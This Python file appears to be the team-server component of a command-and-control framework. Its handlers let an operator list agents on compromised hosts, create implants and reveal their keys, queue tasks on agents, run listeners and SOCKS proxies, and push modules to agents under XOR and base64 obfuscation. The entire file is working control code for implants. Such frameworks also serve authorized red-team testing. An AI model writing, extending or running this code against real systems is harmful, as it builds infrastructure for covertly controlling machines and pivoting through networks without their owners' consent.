import hashlib
import json
import os

from connect.convert import string_to_base64, xor_base64
from connect.server.models import AgentModel, ImplantModel, TaskModel, get_session
from functools import wraps
from connect.listener import listener_manager


class TeamServerEvents:

    def __init__(self, app, key, sio_server, socks_manager):
        self.app = app
        self.key = key
        self.sio_server = sio_server
        self.socks_manager = socks_manager
        self.sio_server.on('agent', self.agent)
        self.sio_server.on('connect', self.connect)
        self.sio_server.on('implant', self.implant)
        self.sio_server.on('task', self.task)
        self.sio_server.on('listener', self.listener)

    async def connect(self, sid, environ, auth: str = 'no key provided'):
        if auth != self.key:
            await self.sio_server.disconnect(sid)
            return

    def json_event_handler(handler_function):
        @wraps(handler_function)
        async def decorated_handler(self, *args):
            if not args:
                await self.sio_server.emit('error', f'No data provided to {handler_function.__name__}.')
                return

            try:
                deserialized_json = json.loads(args[1])
            except json.JSONDecodeError:
                await self.sio_server.emit('error', f'Invalid JSON provided to {handler_function.__name__} event: {args[0]}')
                return

            await handler_function(self, deserialized_json)

        return decorated_handler

    @json_event_handler
    async def agent(self, data):
        list_agent = data.get('list', None)
        with get_session() as session:
            if list_agent:
                seconds = int(list_agent.get('seconds'))
                agents = [agent.get_agent() for agent in session.query(AgentModel).all() if
                          0 <= agent.get_delta_seconds() <= seconds]
                for agent in agents:
                    agent['socks'] = '•' * 4
                    try:
                        socks_server = self.socks_manager.socks_servers[agent['id']]
                        agent['socks'] = f'{socks_server.port}'
                    except KeyError:
                        continue
                if not agents:
                    await self.sio_server.emit('information', 'There are no agents')
                    return
                await self.sio_server.emit('agents', agents)
                return

            await self.sio_server.emit('information', f'Agent event hit with the following data: {data}')

    # Event handler for implant actions
    @json_event_handler
    async def implant(self, data):
        create_implant = 'create' in data.keys()
        list_implant = 'list' in data.keys()
        with get_session() as session:
            if create_implant:
                new_implant = ImplantModel()
                session.add(new_implant)
                session.commit()
                await self.sio_server.emit('success', f'Implant {new_implant.id} created their key is: {new_implant.key}')
                return

            if list_implant:
                implants = [implant.get_implant() for implant in session.query(ImplantModel).all()]
                if not implants:
                    await self.sio_server.emit('information', 'There are no implants')
                    return
                await self.sio_server.emit('implants', implants)
                return

            await self.sio_server.emit('information', f'Implant event hit with the following data: {data}')

    # Event handler for task actions
    @json_event_handler
    async def task(self, data):
        create_task = data.get('create', None)
        with get_session() as session:
            if create_task:
                agent = session.query(AgentModel).filter_by(
                    id=create_task['agent']).first()  # ToDo: Error handling on agents that don't exist
                if not agent:
                    await self.sio_server.emit('error', f'Agent `{create_task["agent"]}` does not exist.')
                    return

                parameters = ','.join(parameter for parameter in create_task.get('parameters',
                                                                                 []))  # ToDo: If parameters are provided that are not a list then break
                misc = ','.join(parameter for parameter in
                                create_task.get('misc', []))  # ToDo: If misc is provided that is not a list then break
                module = create_task.get('module', None)

                if not await self.load_module(agent, module, session):
                    return

                new_task = TaskModel(agent=agent, method=create_task['method'], type=create_task['type'],
                                     parameters=parameters, misc=misc)
                session.add(new_task)
                await self.sio_server.emit('information', f'Scheduled task for method: `{new_task.method}`')
                return

        await self.sio_server.emit('information', f'Task event hit with the following data: {data}')

    async def load_module(self, agent, module, session):
        if not module:
            return True
        if not os.path.exists(module):
            await self.sio_server.emit('error', f'Module {module} does not exist.')
            return False
        module_bytes = open(module, 'rb').read()
        module_md5 = hashlib.md5(module_bytes).hexdigest()
        if module_md5 in agent.loaded_modules:
            return True
        module, key = xor_base64(module_bytes)
        parameters = ','.join([string_to_base64(module), string_to_base64(key)])
        new_task = TaskModel(agent=agent, method='load', type=1, parameters=parameters, misc='')
        session.add(new_task)
        await self.sio_server.emit('information', f'Scheduled task for method: `{new_task.method}`')
        agent.loaded_modules = module_md5 if not agent.loaded_modules else ','.join(
            agent.loaded_modules) + f',{module_md5}'
        session.add(agent)
        return True

    @json_event_handler
    async def listener(self, data):
        create_listener = data.get('create', None)
        stop_listener = data.get('stop', None)
        list_listener = 'list' in data.keys()

        if create_listener:
            await listener_manager.create_listener(create_listener['ip'], create_listener['port'], self.socks_manager, self.sio_server)
            return

        if stop_listener:
            await listener_manager.stop_listener(stop_listener['ip'], stop_listener['port'], self.sio_server)
            return

        if list_listener:
            listeners = listener_manager.get_listeners()
            if not listeners:
                await self.sio_server.emit('information', 'There are no listeners.')
                return
            await self.sio_server.emit('listeners', listeners)
            return

        await self.sio_server.emit('information', f'Listener event hit with the following data: {data}')